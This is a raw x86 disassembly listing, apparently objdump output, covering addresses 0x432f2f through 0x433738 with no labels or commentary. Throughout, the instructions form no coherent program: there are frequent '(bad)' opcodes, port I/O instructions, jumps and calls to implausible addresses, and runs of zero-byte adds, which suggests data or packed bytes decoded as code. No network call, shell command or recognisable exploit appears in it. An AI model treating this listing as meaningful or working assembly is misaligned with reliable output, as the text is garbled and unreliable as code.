  432f2f:	mov    DWORD PTR [ecx],edi
  432f31:	out    0x81,eax
  432f33:	mul    DWORD PTR [ebx+ecx*1]
  432f36:	(bad)  
  432f37:	dec    DWORD PTR [ebp+ebx*2-0x1]
  432f3b:	imul   ebx,DWORD PTR [edx+ebp*8],0x457bbc13
  432f42:	cli    
  432f43:	adc    BYTE PTR [eax-0x6],0x88
  432f47:	inc    ebp
  432f48:	js     0x432ed5
  432f4a:	mov    edx,0xc735ae74
  432f4f:	mov    edx,0xffffff10
  432f54:	aaa    
  432f55:	mov    ecx,0xff008705
  432f5a:	(bad)  
  432f5b:	call   DWORD PTR [edi+0x4b]
  432f5e:	out    dx,al
  432f5f:	jb     0x432f1a
  432f61:	sub    eax,0xfca
  432f66:	add    BYTE PTR [eax],al
  432f68:	add    BYTE PTR [edi-0x1e],cl
  432f6b:	cli    
  432f6c:	dec    esp
  432f6e:	fisttp QWORD PTR [ecx]
  432f70:	nop
  432f71:	push   edi
  432f72:	push   esp
  432f73:	(bad)  
  432f74:	mov    esp,DWORD PTR [ecx]
  432f76:	out    dx,al
  432f77:	adc    DWORD PTR [ebp-0x58],0x47f04b7d
  432f7e:	je     0x432f5a
  432f80:	mov    esp,DWORD PTR [ecx-0xe]
  432f83:	jg     0x432f47
  432f85:	pushf  
  432f86:	or     bh,dl
  432f88:	dec    DWORD PTR [edi]
  432f8a:	sar    dl,1
  432f8c:	cmp    cl,dl
  432f8e:	je     0x432f98
  432f90:	ja     0x433007
  432f92:	sbb    eax,0x2103cfdb
  432f97:	test   DWORD PTR [ecx+edx*4-0x6f],eax
  432f9b:	mov    edi,ebp
  432f9d:	mov    fs,WORD PTR [edx]
  432f9f:	test   DWORD PTR [ecx+eiz*2-0x5d],edx
  432fa3:	shr    edi,0xfe
  432fa6:	fisub  WORD PTR [ebx]
  432fa8:	xchg   BYTE PTR [esi-0xb],ah
  432fab:	mov    ch,bl
  432fad:	out    dx,al
  432fae:	aam    0xfb
  432fb0:	jl     0x432ff7
  432fb2:	add    eax,0x9f321646
  432fb7:	ds ins DWORD PTR es:[edi],dx
  432fb9:	fs dec eax
  432fbb:	push   es
  432fbc:	cmp    DWORD PTR [eax+eiz*1],0x4a32fffa
  432fc3:	push   DWORD PTR [esi-0x1e08f]
  432fc9:	push   cs
  432fca:	push   ds
  432fcb:	jmp    0x432fa6
  432fcd:	add    BYTE PTR [eax],al
  432fcf:	add    BYTE PTR [eax],al
  432fd1:	add    dh,ch
  432fd3:	pop    esi
  432fd4:	add    al,BYTE PTR [edi-0x53dc40]
  432fda:	mov    ds:0xd50ae51,eax
  432fdf:	call   0x9d3e2fb5
  432fe4:	cmp    dl,BYTE PTR [ebx]
  432fe6:	clc    
  432fe7:	fisttp DWORD PTR [ecx+0x126efe70]
  432fed:	xchg   BYTE PTR [eax],bh
  432fef:	shrd   DWORD PTR [ebp+0x45],ecx,cl
  432ff3:	xchg   esp,eax
  432ff4:	rol    BYTE PTR [edi],0xfe
  432ff7:	jecxz  0x432ff0
  432ff9:	xchg   BYTE PTR ds:0xa7fab31f,ah
  432fff:	pushf  
  433000:	aas    
  433001:	movd   DWORD PTR [eax+edx*4+0x54],mm3
  433006:	add    ch,bl
  433008:	sbb    BYTE PTR [ebp+esi*4+0x3086cfd9],al
  43300f:	add    ah,BYTE PTR [ebp-0xf39e534]
  433015:	mov    bl,0x9
  433017:	out    dx,eax
  433018:	push   0x1e037298
  43301d:	xchg   ecx,eax
  43301e:	ins    BYTE PTR es:[edi],dx
  43301f:	add    BYTE PTR [esp+ecx*1],0x7b
  433023:	(bad)  
  433024:	repz (bad) 
  433026:	repnz xchg al,ah
  433029:	add    dh,BYTE PTR [edi-0x72]
  43302c:	loop   0x432fae
  43302e:	and    cl,BYTE PTR [ecx+0x6b6f2b43]
  433034:	in     eax,0x3d
  433036:	add    BYTE PTR [eax],al
  433038:	add    BYTE PTR [eax],al
  43303a:	add    BYTE PTR [ebx+0x56c15f31],al
  433040:	std    
  433041:	lea    ebp,es:[ecx-0xc0644e6]
  433048:	mov    esi,0x12b9dd40
  43304d:	loope  0x432fd0
  43304f:	push   eax
  433050:	or     DWORD PTR [ecx],ebp
  433052:	pop    ss
  433053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433054:	imul   BYTE PTR [ebp-0x37]
  433057:	es retf 
  433059:	stos   DWORD PTR es:[edi],eax
  43305a:	daa    
  43305b:	jg     0x432fe1
  43305d:	hlt    
  43305e:	push   ss
  43305f:	wbinvd 
  433061:	pop    ebp
  433062:	mov    cl,0xfe
  433064:	mov    bl,0x8e
  433066:	add    edi,esi
  433068:	out    dx,al
  433069:	sub    BYTE PTR [edi],dh
  43306b:	mov    bl,0x2
  43306d:	pop    esi
  43306e:	rcl    esi,0x7c
  433071:	xchg   ebx,eax
  433072:	sub    esp,DWORD PTR [ebx+0x3e]
  433075:	lock mov dh,0x3c
  433078:	lods   eax,DWORD PTR ds:[esi]
  433079:	ins    DWORD PTR es:[edi],dx
  43307a:	and    BYTE PTR [ecx],dh
  43307c:	inc    ebp
  43307d:	cmp    ecx,DWORD PTR [ebx-0x20437b22]
  433083:	xor    edi,DWORD PTR [ebp+0x23]
  433086:	or     al,0x27
  433088:	mov    cl,0x6d
  43308a:	cwde   
  43308b:	jle    0x433062
  43308d:	(bad)  
  43308e:	mov    esi,0x175406dc
  433093:	shl    BYTE PTR [edi+0xc852cc2],cl
  433099:	cli    
  43309a:	jmp    0x91b7ac15
  43309f:	add    BYTE PTR [eax],al
  4330a1:	add    BYTE PTR [eax],al
  4330a3:	add    cl,bh
  4330a5:	(bad)  
  4330a6:	jecxz  0x433108
  4330a8:	in     eax,0x20
  4330aa:	out    0xdd,eax
  4330ac:	popf   
  4330ad:	or     dl,bh
  4330af:	push   0xffffffb2
  4330b1:	repz test BYTE PTR [ecx+0xf5b00fa],ch
  4330b8:	inc    esi
  4330b9:	dec    eax
  4330ba:	cmp    ebx,DWORD PTR cs:[edi]
  4330bd:	and    esp,0x4eb4b7bc
  4330c3:	inc    ecx
  4330c4:	rdseed edi
  4330c7:	call   0x724a74c3
  4330cc:	jle    0x433148
  4330ce:	pop    esp
  4330cf:	sbb    eax,0x6cdfaf01
  4330d4:	fs xchg esp,eax
  4330d6:	or     eax,0xf6816ebb
  4330db:	add    DWORD PTR es:[edi],0xfffffffa
  4330df:	call   0xaef9:0x1d5c797e
  4330e6:	mul    DWORD PTR [edx+0x64]
  4330e9:	lahf   
  4330ea:	add    ebp,ebp
  4330ec:	jbe    0x4330f0
  4330ee:	callw  0x390e
  4330f2:	stc    
  4330f3:	fadd   QWORD PTR [edx+0x2c]
  4330f6:	ds jmp 0x704e74f3
  4330fc:	sbb    cl,BYTE PTR [esp+eax*4]
  4330ff:	test   eax,0xa02e53e5
  433104:	das    
  433105:	add    eax,DWORD PTR [eax]
  433107:	jmp    0x43310c
  43310c:	add    BYTE PTR [esi-0x31],dh
  43310f:	leave  
  433110:	add    bl,al
  433112:	xchg   bh,dh
  433114:	add    BYTE PTR [ebx+eax*1+0x74e84583],bl
  43311b:	push   ss
  43311c:	cmp    edi,esp
  43311e:	std    
  43311f:	jp     0x43310d
  433121:	mov    WORD PTR [ebx],es
  433123:	add    bl,ch
  433125:	mov    es,WORD PTR [eax+0x4f170047]
  43312b:	(bad)  
  43312c:	mov    ebp,DWORD PTR [ecx-0x1a]
  43312f:	adc    DWORD PTR [ebp-0x20],0xe7f04b79
  433136:	inc    edi
  433137:	out    dx,al
  433138:	sbb    DWORD PTR [esi],0x4c0003fe
  43313e:	or     bh,0x0
  433141:	xchg   edi,eax
  433142:	shr    BYTE PTR [esi+ecx*1+0x2b],0x7
  433147:	xor    eax,edx
  433149:	sub    bh,bl
  43314b:	mov    BYTE PTR [ebp-0x80],al
  43314e:	jnp    0x4331c3
  433150:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433152:	or     BYTE PTR [edi+0x4b7bc055],al
  433158:	lock xchg edi,eax
  43315a:	outs   dx,DWORD PTR ds:[esi]
  43315b:	fimul  DWORD PTR [ebx-0xc7e1d27]
  433161:	inc    edi
  433162:	js     0x43314a
  433164:	mov    eax,DWORD PTR [edi+0x9]
  433167:	jnp    0x433159
  433169:	aaa    
  43316a:	mov    ebp,0xbe99c711
  43316f:	ins    BYTE PTR es:[edi],dx
  433170:	adc    DWORD PTR [eax],eax
  433172:	add    BYTE PTR [eax],al
  433174:	add    BYTE PTR [eax],al
  433176:	jnp    0x433173
  433178:	cmp    cl,0xd8
  43317b:	push   es
  43317c:	cli    
  43317d:	jmp    FWORD PTR [edx+0x6]
  433180:	mov    cl,0x4
  433182:	fadd   DWORD PTR [edx]
  433184:	add    bl,ch
  433186:	into   
  433187:	sbb    eax,ebx
  433189:	mov    ebx,DWORD PTR [ecx+0x754d82fa]
  43318f:	and    DWORD PTR [eax-0x4c30d401],ebp
  433195:	push   eax
  433196:	int    0x4
  433198:	sar    bh,cl
  43319a:	mov    dl,0x9b
  43319c:	cmp    dl,BYTE PTR [ebx]
  43319e:	lock pop eax
  4331a0:	mov    DWORD PTR [eax-0x12],esi
  4331a3:	in     eax,dx
  4331a4:	pop    ss
  4331a5:	xchg   BYTE PTR [eax],dh
  4331a7:	or     eax,0x94254daf
  4331ac:	mov    ecx,0xf7e0fe07
  4331b1:	xchg   BYTE PTR ds:0xa7faad1d,ah
  4331b7:	fwait
  4331b8:	cmp    cl,BYTE PTR [edi]
  4331ba:	scas   al,BYTE PTR es:[edi]
  4331bb:	pop    eax
  4331bc:	mov    DWORD PTR [eax+edi*8-0x28],edx
  4331c0:	adc    al,BYTE PTR [ebp+esi*1-0x577935ea]
  4331c7:	lahf   
  4331c8:	(bad)  
  4331c9:	jg     0x43315c
  4331cb:	adc    ebp,DWORD PTR [esi-0x6d649f8c]
  4331d1:	pop    es
  4331d2:	je     0x433234
  4331d4:	mov    DWORD PTR [ecx],ecx
  4331d6:	cmc    
  4331d7:	aas    
  4331d8:	push   es
  4331d9:	inc    BYTE PTR [eax]
  4331db:	add    BYTE PTR [eax],al
  4331dd:	add    BYTE PTR [eax],al
  4331df:	js     0x43322f
  4331e1:	sti    
  4331e2:	jg     0x43318d
  4331e4:	and    edi,edi
  4331e6:	add    ch,BYTE PTR [ecx-0x654086e3]
  4331ec:	mov    esi,0x18ec0a27
  4331f1:	cmp    al,0xe
  4331f3:	and    ah,BYTE PTR [ebx-0x26911c47]
  4331f9:	test   DWORD PTR [ebp+ecx*1-0x79],edx
  4331fd:	clc    
  4331fe:	xchg   BYTE PTR [eax],bh
  433200:	add    edx,esi
  433202:	inc    esp
  433203:	in     eax,0x1c
  433205:	and    BYTE PTR ds:0x720e14e2,0x69
  43320c:	add    ch,BYTE PTR [esi-0x3f]
  43320f:	(bad)  
  433210:	retf   
  433211:	sub    esp,DWORD PTR [eax]
  433213:	jg     0x433195
  433215:	hlt    
  433216:	adc    bh,BYTE PTR [edi+0x6e915d05]
  43321c:	jns    0x433239
  43321e:	adc    BYTE PTR [eax-0x68],al
  433221:	call   0x9185b338
  433226:	(bad)  
  433227:	mov    ds:0xf3282378,al
  43322c:	mov    bh,0x90
  43322e:	jg     0x4331f2
  433230:	and    DWORD PTR [esp+edi*8-0x781ecc8d],0x138904f1
  43323b:	repz (bad) 
  43323d:	lock popf 
  43323f:	jb     0x4331f3
  433241:	sbb    BYTE PTR [ebx+0x0],bh
  433247:	add    ah,al
  433249:	sbb    ah,BYTE PTR [edi+ecx*8+0x62]
  43324d:	add    eax,0x7f864865
  433252:	sub    BYTE PTR [ebx],al
  433254:	clc    
  433255:	lea    ebx,[edx+0x13]
  433258:	dec    edi
  433259:	ja     0x433206
  43325b:	lss    edi,FWORD PTR [ecx+0x21]
  43325f:	jg     0x43328d
  433261:	sbb    ch,BYTE PTR [esi+ecx*1]
  433264:	das    
  433265:	add    eax,0x7f764865
  43326a:	sub    BYTE PTR [ebx],al
  43326c:	clc    
  43326d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43326e:	sub    dl,BYTE PTR [ebx]
  433270:	pop    ds
  433271:	ja     0x433226
  433273:	shld   DWORD PTR [ecx+0x21],edi,cl
  433277:	jg     0x4332b5
  433279:	sbb    al,BYTE PTR [esi+ecx*1-0x1]
  43327d:	add    al,0x65
  43327f:	dec    eax
  433280:	jbe    0x433301
  433282:	sub    BYTE PTR [ebx],al
  433284:	clc    
  433285:	mov    ebp,0xcaef12fa
  43328a:	jmp    FWORD PTR [ebx-0x4d7b078e]
  433290:	test   BYTE PTR [eax],cl
  433292:	cli    
  433293:	je     0x4332a2
  433295:	sub    DWORD PTR [ebp+0x72],ecx
  433298:	aas    
  433299:	jl     0x433264
  43329b:	rcl    ebx,0xb
  43329e:	cli    
  43329f:	into   
  4332a0:	repz inc eax
  4332a2:	add    ebp,DWORD PTR [esi+esi*1-0x8]
  4332a6:	test   BYTE PTR [edx],cl
  4332a8:	xchg   DWORD PTR [eax],ecx
  4332aa:	cli    
  4332ab:	add    BYTE PTR fs:[eax],al
  4332ae:	add    BYTE PTR [eax],al
  4332b0:	add    BYTE PTR [ebp+0x2f624f08],ch
  4332b6:	jl     0x433281
  4332b8:	xchg   ecx,eax
  4332b9:	jmp    0x4332c9
  4332bb:	cli    
  4332bc:	sahf   
  4332bd:	repz inc eax
  4332bf:	add    ebp,DWORD PTR [esi+esi*1-0x8]
  4332c3:	test   dl,ah
  4332c5:	fs or  dl,bh
  4332c8:	push   0x5
  4332ca:	or     BYTE PTR [eax],al
  4332cc:	out    dx,al
  4332cd:	std    
  4332ce:	add    bh,dl
  4332d0:	jbe    0x433259
  4332d2:	jl     0x433330
  4332d4:	mov    ebx,ebx
  4332d6:	mov    dh,0xdb
  4332d8:	mov    ecx,0xb752b30b
  4332dd:	outs   dx,BYTE PTR ds:[esi]
  4332de:	or     DWORD PTR ds:0xc38376e9,esi
  4332e4:	cmc    
  4332e5:	in     eax,dx
  4332e6:	inc    ebx
  4332e7:	or     ch,BYTE PTR [esp+ebx*2+0x6]
  4332eb:	cli    
  4332ec:	ds cmc 
  4332ee:	scas   al,BYTE PTR es:[edi]
  4332ef:	sti    
  4332f0:	fwait
  4332f1:	mov    ds:0x7e1f8640,eax
  4332f6:	shl    ebp,1
  4332f8:	es addr16 test bl,al
  4332fc:	in     eax,0xfd
  4332fe:	inc    ebx
  4332ff:	or     ch,BYTE PTR [esp+esi*4+0x6]
  433303:	cli    
  433304:	push   cs
  433305:	icebp  
  433306:	xchg   bl,bh
  433308:	add    BYTE PTR [eax*2+0x7adb0600],cl
  43330f:	mov    edi,0x81f1ebfd
  433314:	inc    ebp
  433315:	add    BYTE PTR [eax],al
  433317:	add    BYTE PTR [eax],al
  433319:	add    BYTE PTR [eax+0x50],ch
  43331c:	pop    eax
  43331d:	mov    ecx,DWORD PTR [edi]
  43331f:	push   esi
  433320:	and    ebp,0xccc6bd89
  433326:	add    DWORD PTR [ebp+0x6598be6],0x6b275649
  433330:	push   es
  433331:	push   edi
  433332:	daa    
  433333:	mov    eax,0xa39bf981
  433338:	mov    ebp,0xbfd11710
  43333d:	call   0x8bebbce
  433342:	pop    ds
  433343:	fst    QWORD PTR ds:0x83024689
  433349:	fcomp  DWORD PTR [ebx-0x20fa2a5d]
  43334f:	fld    DWORD PTR ds:0xa74e54f
  433355:	mov    ebp,DWORD PTR [ecx+0x7]
  433358:	add    eax,0x790713ac
  43335d:	out    0x5b,eax
  43335f:	cmp    BYTE PTR [ebp-0xac44],0xc0
  433366:	mov    ah,0x7
  433368:	xchg   DWORD PTR [edx+0x40],edi
  43336b:	xchg   BYTE PTR [edi-0x53fe4575],bh
  433371:	clc    
  433372:	daa    
  433373:	jle    0x43334f
  433375:	pop    ds
  433376:	xchg   ebp,eax
  433377:	cmp    al,0x2
  433379:	mov    ecx,DWORD PTR [ebp+0x1]
  43337c:	lods   al,BYTE PTR ds:[esi]
  43337d:	lock add BYTE PTR [eax],al
  433380:	add    BYTE PTR [eax],al
  433382:	add    BYTE PTR [ecx],ah
  433384:	shl    ch,0xb
  433387:	retf   
  433388:	mov    edi,0xda7505e1
  43338d:	sbb    eax,0xd0f8f604
  433392:	jle    0x433368
  433394:	sbb    eax,DWORD PTR [ebx]
  433396:	leave  
  433397:	dec    ebx
  433398:	xchg   edx,eax
  433399:	rol    DWORD PTR [ebx],0xec
  43339c:	push   ds
  43339d:	stos   DWORD PTR es:[edi],eax
  43339e:	pop    esp
  43339f:	mov    dh,0xe4
  4333a1:	aas    
  4333a2:	retf   
  4333a3:	ror    DWORD PTR [edx+edi*1-0x35],0xb9
  4333a8:	push   esp
  4333a9:	cmp    cl,bl
  4333ab:	mov    cl,0xc5
  4333ad:	jl     0x43339a
  4333af:	test   BYTE PTR [edx+edx*4+0x4e],0x4b
  4333b4:	in     al,0x7c
  4333b6:	out    dx,eax
  4333b7:	inc    sp
  4333b9:	rcl    esi,cl
  4333bb:	pop    esi
  4333bc:	inc    esp
  4333bd:	xchg   ecx,eax
  4333be:	add    eax,0x5a69dbe8
  4333c3:	xor    eax,eax
  4333c5:	jl     0x4333ab
  4333c7:	sub    BYTE PTR [eax+0x7b],bl
  4333ca:	inc    ecx
  4333cb:	sbb    eax,0xee47c818
  4333d0:	loop   0x433381
  4333d2:	push   cs
  4333d3:	ret    
  4333d4:	aaa    
  4333d5:	jnp    0x433428
  4333d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4333d8:	sbb    BYTE PTR [ebp+0x1c21c74f],ch
  4333de:	add    eax,0x7efdeb9f
  4333e3:	cmp    DWORD PTR [eax],eax
  4333e5:	cmp    DWORD PTR [edi+0x0],0x0
  4333ec:	shl    esi,0x84
  4333ef:	mov    BYTE PTR [edx+0x45],0xd5
  4333f3:	mov    WORD PTR [eax-0x447952a9],?
  4333f9:	sti    
  4333fa:	jl     0x4333c5
  4333fc:	sbb    eax,0x22fa06ac
  433401:	ins    DWORD PTR es:[edi],dx
  433402:	inc    ecx
  433403:	add    esi,eax
  433405:	sub    edx,DWORD PTR [ecx+0x2e02f604]
  43340b:	adc    BYTE PTR [ebx],dl
  43340d:	adc    DWORD PTR [eax-0x72],ebp
  433410:	push   es
  433411:	push   ebx
  433412:	sahf   
  433413:	add    bh,bl
  433415:	jne    0x4333fb
  433417:	dec    esp
  433418:	or     eax,0xf3100302
  43341d:	dec    eax
  43341e:	mov    bh,0x7e
  433420:	xor    DWORD PTR [esi-0x15538368],ecx
  433426:	das    
  433427:	or     ecx,edi
  433429:	add    DWORD PTR [edi+0x48],esp
  43342c:	jbe    0x4333b5
  43342e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43342f:	cwde   
  433430:	ret    
  433431:	test   BYTE PTR [esi+0x1748f30f],bl
  433437:	or     DWORD PTR [ecx-0x6e],0xeabc7b15
  43343e:	xchg   DWORD PTR [edi+ebx*4],ecx
  433441:	add    DWORD PTR [edi+0x48],esp
  433444:	jbe    0x4333cd
  433446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433447:	cwde   
  433448:	xchg   ebx,eax
  433449:	test   BYTE PTR [esi+0x7347f90f],ch
  43344f:	mov    ah,0x0
  433451:	add    BYTE PTR [eax],al
  433453:	add    BYTE PTR [eax],al
  433455:	sti    
  433456:	dec    eax
  433457:	xlat   BYTE PTR ds:[ebx]
  433458:	jp     0x433406
  43345a:	jmp    0x4867:0x16f0c5f
  433461:	jbe    0x4333ea
  433463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433464:	cwde   
  433465:	arpl   WORD PTR [esi+ebx*4-0x48b80cf1],ax
  43346c:	add    cl,0x9a
  43346f:	mov    eax,0xd7ea3c7a
  433474:	or     edi,DWORD PTR [edi]
  433476:	add    DWORD PTR [edi+0x48],esp
  433479:	jbe    0x433402
  43347b:	daa    
  43347c:	cwde   
  43347d:	xor    eax,DWORD PTR [esi+ebp*1-0x8b80cf1]
  433484:	or     cl,0x9e
  433487:	add    BYTE PTR [ebx+0x71e8cb9f],bl
  43348d:	cmp    esp,0x5bd6af9
  433493:	sub    DWORD PTR [ecx],0xffffffdd
  433496:	(bad)  
  433497:	jle    0x4334bb
  433499:	push   0xffffff88
  43349b:	inc    ebx
  43349c:	ins    DWORD PTR es:[edi],dx
  43349d:	sub    dl,BYTE PTR [ecx-0x75]
  4334a0:	pushf  
  4334a1:	stos   BYTE PTR es:[edi],al
  4334a2:	jmp    0xfcb73436
  4334a7:	test   DWORD PTR [edi+0x494b8dc6],ebp
  4334ad:	or     BYTE PTR [eax-0x6b82e36],cl
  4334b3:	stc    
  4334b4:	fdivrp st(7),st
  4334b6:	les    ecx,FWORD PTR [esp+ebp*2]
  4334b9:	add    BYTE PTR [eax],al
  4334bb:	add    BYTE PTR [eax],al
  4334bd:	add    BYTE PTR [esi],dh
  4334bf:	jne    0x4334be
  4334c1:	imul   ebp,DWORD PTR [edi-0x4],0x8dc12f85
  4334c8:	push   ebx
  4334c9:	mov    ebp,0xc1ca87e4
  4334ce:	out    dx,eax
  4334cf:	clc    
  4334d0:	stc    
  4334d1:	scas   al,BYTE PTR es:[edi]
  4334d2:	test   esp,0x75366c04
  4334d8:	std    
  4334d9:	imul   edi,DWORD PTR [edi],0x652c85fc
  4334df:	mov    cs,WORD PTR [ebx-0x73]
  4334e2:	icebp  
  4334e3:	inc    esi
  4334e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4334e5:	jb     0x433517
  4334e7:	xor    BYTE PTR [edi+0x72],cl
  4334ea:	mov    al,ds:0x7e417b8a
  4334ef:	push   ebp
  4334f0:	clc    
  4334f1:	outs   dx,BYTE PTR ds:[esi]
  4334f2:	add    DWORD PTR [eax-0x4002123c],0x74
  4334f9:	jmp    0xfbfd:0x62f9c8f7
  433500:	mov    esp,DWORD PTR [edx+ecx*8-0x25ff7ab1]
  433507:	rol    DWORD PTR [edx-0x5a455a32],cl
  43350d:	mov    ecx,esp
  43350f:	push   ebx
  433510:	loope  0x4334eb
  433512:	dec    ebx
  433513:	adc    dh,dh
  433515:	sbb    DWORD PTR [eax+0x7],0xffffff83
  433519:	shr    al,0x4
  43351c:	jns    0x4334e9
  43351e:	arpl   WORD PTR [edi+edi*1+0x30],di
  433522:	add    BYTE PTR [eax],al
  433524:	add    BYTE PTR [eax],al
  433526:	add    BYTE PTR [ecx-0x3e],dl
  433529:	mov    cl,0x51
  43352b:	addr16 cmp eax,0xdebc1e1
  433531:	test   BYTE PTR [ebx-0x3f7cf878],0x48
  433538:	add    al,0x79
  43353a:	retf   
  43353b:	sar    DWORD PTR [ecx+0x3f],cl
  43353e:	xor    BYTE PTR [ecx-0x49],dl
  433541:	mov    ch,0x52
  433543:	push   edi
  433544:	inc    eax
  433545:	loope  0x4334f0
  433547:	retf   
  433548:	or     eax,0xad883f6
  43354d:	add    eax,0x68
  433550:	add    DWORD PTR [ecx-0x35],edi
  433553:	jecxz  0x4335d4
  433555:	inc    esp
  433556:	shr    BYTE PTR [ecx+edi*2+0x3f],0x30
  43355b:	pop    es
  43355c:	inc    eax
  43355d:	loope  0x4334f0
  43355f:	jmp    0x43356e
  433561:	test   BYTE PTR [ebx-0x3f7cf538],0x88
  433568:	add    DWORD PTR [ecx-0x35],edi
  43356b:	repz js 0x4335ad
  43356e:	xor    cl,dl
  433570:	mov    edi,0x40d751bd
  433575:	loope  0x4335f0
  433577:	retf   
  433578:	or     eax,0xa9883f6
  43357d:	add    eax,0x28
  433580:	add    bh,BYTE PTR [ecx-0x35]
  433583:	jne    0x4335dd
  433585:	ja     0x4335c8
  433587:	gs pop esi
  433589:	mov    cl,0xc7
  43358b:	add    BYTE PTR [eax],al
  43358d:	add    BYTE PTR [eax],al
  43358f:	add    bh,al
  433591:	je     0x4335cd
  433593:	out    0x34,eax
  433595:	cmp    BYTE PTR [ebx],cl
  433597:	cli    
  433598:	imul   BYTE PTR [eax+ecx*1]
  43359b:	test   DWORD PTR ds:0x3e7f00b5,esi
  4335a1:	sub    BYTE PTR [ecx+0x44],bh
  4335a4:	add    DWORD PTR [ecx+0x64454178],edi
  4335aa:	cmp    ah,bh
  4335ac:	sbb    al,0x18
  4335ae:	or     edi,edx
  4335b0:	imul   BYTE PTR [eax+ecx*1]
  4335b3:	test   DWORD PTR [ebp-0x5180ff8c],esi
  4335b9:	idiv   DWORD PTR [eax+0x4c]
  4335bc:	shl    DWORD PTR [ecx-0x77],1
  4335bf:	out    0xfe,eax
  4335c1:	gs pop eax
  4335c3:	mov    BYTE PTR [eax],dh
  4335c5:	lds    esi,FWORD PTR [esi+0x7c]
  4335c8:	mov    ecx,0xf80a286d
  4335cd:	(bad)  
  4335ce:	std    
  4335cf:	push   DWORD PTR [ebp+0x74]
  4335d2:	ret    0xf80f
  4335d5:	test   al,0x91
  4335d7:	inc    eax
  4335d8:	out    dx,al
  4335d9:	and    eax,0x3b8c36f8
  4335de:	cld    
  4335df:	xchg   DWORD PTR [ecx-0x10],ebp
  4335e2:	jbe    0x433660
  4335e4:	adc    DWORD PTR [ebx-0x6ad77700],0xcae9fa82
  4335ee:	or     al,0xe1
  4335f1:	out    0x78,al
  4335f3:	push   esp
  4335f4:	add    BYTE PTR [eax],al
  4335f6:	add    BYTE PTR [eax],al
  4335f8:	add    BYTE PTR [ecx+0x71],ah
  4335fb:	mov    ebx,0xb360c72f
  433600:	sbb    esp,DWORD PTR [ebp-0x5bfc3ca0]
  433606:	add    dh,BYTE PTR [ebp+0x2382320c]
  43360c:	repz add DWORD PTR [edi+0x53],0xffffff97
  433611:	xor    eax,DWORD PTR [ecx+0x7f530c1e]
  433617:	inc    ebx
  433618:	jp     0x4335bb
  43361a:	(bad)  
  43361b:	sub    BYTE PTR fs:[ecx+0x6a8e6677],ah
  433622:	add    dh,BYTE PTR [ebx+0x5f47f39c]
  433628:	js     0x4335ab
  43362a:	push   ds
  43362b:	fiadd  WORD PTR [ebx+ecx*4+0x0]
  43362f:	pop    esi
  433630:	or     esi,DWORD PTR [ebx+0x7f]
  433633:	or     eax,DWORD PTR [ebx]
  433635:	popa   
  433636:	and    ebp,DWORD PTR [esi-0x3a]
  433639:	fimul  WORD PTR [ecx+0x350d3a9]
  43363f:	push   eax
  433640:	mov    cl,0x42
  433642:	push   ebx
  433643:	xchg   ecx,eax
  433644:	sbb    esi,DWORD PTR [ebp+esi*1-0x39bdfc19]
  43364b:	repz cmp dl,0x77
  43364f:	in     al,dx
  433650:	jl     0x43368b
  433652:	(bad)  
  433653:	mov    esi,0xc2c92a07
  433658:	xchg   DWORD PTR [ecx],esp
  43365a:	mov    edx,0x91e7
  43365f:	add    BYTE PTR [eax],al
  433661:	add    BYTE PTR [eax-0x7f],dl
  433664:	xor    al,0xe8
  433666:	xchg   edx,eax
  433667:	ja     0x43366c
  433669:	jg     0x43368c
  43366b:	sbb    ch,BYTE PTR [esi-0x3e]
  43366e:	push   edx
  43366f:	mov    DWORD PTR [ecx],ebp
  433671:	call   0xb2a1869d
  433676:	jbe    0x4336ca
  433678:	cmp    BYTE PTR [ebx],cl
  43367a:	cmp    BYTE PTR [ecx-0x346c0b55],al
  433680:	mov    esi,0x4e142
  433685:	mov    edx,0xf5c834b6
  43368a:	jae    0x433709
  43368c:	lds    esp,FWORD PTR [esi-0x3e]
  43368f:	inc    esi
  433690:	mov    eax,0xc9247972
  433695:	call   0xe2292f87
  43369a:	stos   DWORD PTR es:[edi],eax
  43369b:	push   esi
  43369c:	mov    eax,0x85f8e5e8
  4336a1:	sub    esi,esp
  4336a3:	ror    DWORD PTR [ecx],cl
  4336a5:	ins    BYTE PTR es:[edi],dx
  4336a6:	push   eax
  4336a7:	add    al,BYTE PTR [eax]
  4336a9:	jmp    0x6d4cf3a3
  4336ae:	adc    al,0x2
  4336b0:	add    cl,ch
  4336b2:	sbb    DWORD PTR [esi-0x4],eax
  4336b5:	pusha  
  4336b6:	sbb    al,0xf1
  4336b8:	je     0x43367e
  4336ba:	imul   eax,DWORD PTR [esi-0x4],0x60
  4336be:	add    eax,DWORD PTR [edx]
  4336c0:	dec    esi
  4336c1:	cdq    
  4336c2:	pop    ebx
  4336c3:	inc    ebx
  4336c4:	xor    BYTE PTR [ecx+0x0],bl
  4336ca:	add    BYTE PTR [eiz*8+0x276b647],al
  4336d1:	jge    0x433680
  4336d3:	sar    BYTE PTR [ebx-0x37],cl
  4336d6:	fdivrp st(5),st
  4336d8:	mov    esp,0x4631ec73
  4336dd:	cld    
  4336de:	ret    0x8577
  4336e1:	(bad)  
  4336e3:	jnp    0x433762
  4336e5:	leave  
  4336e6:	mov    esi,0xe9b87df3
  4336eb:	pop    DWORD PTR [edx+0x276e9dd]
  4336f1:	test   DWORD PTR [edi],ebp
  4336f3:	test   eax,0xc1994b8d
  4336f8:	or     edx,0xffffff81
  4336fb:	jae    0x4336ef
  4336fd:	stc    
  4336fe:	mov    ?,ebx
  433700:	mov    edi,0x3fd10004
  433705:	ins    DWORD PTR es:[edi],dx
  433706:	add    ah,bh
  433708:	sub    BYTE PTR [edx+0x547b0c46],al
  43370e:	clc    
  43370f:	outs   dx,BYTE PTR ds:[esi]
  433710:	jnp    0x4336d9
  433712:	call   0x3949b7
  433717:	iret   
  433718:	cmp    edi,ebp
  43371a:	test   BYTE PTR [ebx+ecx*4-0x5],bl
  43371e:	mov    bl,BYTE PTR [ebx-0x7c]
  433721:	jl     0x433713
  433723:	or     eax,0xd9397793
  433728:	push   ebx
  433729:	je     0x433748
  43372b:	lahf   
  43372c:	mov    ch,BYTE PTR [ecx+0x0]
  433732:	add    BYTE PTR [eax],al
  433734:	shl    eax,0x8c
  433737:	inc    ebp
  433738:	test   al,0xaf
